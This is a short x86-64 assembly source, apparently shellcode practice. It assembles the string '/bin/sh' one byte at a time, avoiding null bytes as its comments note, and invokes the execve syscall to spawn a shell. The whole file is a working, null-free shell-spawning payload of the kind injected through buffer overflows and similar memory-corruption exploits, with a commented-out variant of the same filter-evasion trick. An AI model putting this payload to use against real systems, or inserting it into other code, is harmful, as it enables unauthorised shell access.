global _start

section .text

_start:
    xor rsi, rsi
    xor rdx, rdx

    ; simple avoid restrictions
    ; mov rax, 0x0067732f6e69622f
    ; mov rbx, 0x0001000000000000
    ; add rax, rbx
    xor rbx, rbx

    ; my variant of avoid restrictions, cause doesn't contain \x00
    mov bl, 0x67
    inc bl
    shl rbx, 8

    mov bl, 0x73
    shl rbx, 8

    mov bl, 0x2f
    shl rbx, 8
    mov bl, 0x6e
    shl rbx, 8
    mov bl, 0x69
    shl rbx, 8
    mov bl, 0x62
    shl rbx, 8
    mov bl, 0x2f

    push rbx
    mov rax, rdx
    mov al, 59
    mov rdi, rsp
    syscall
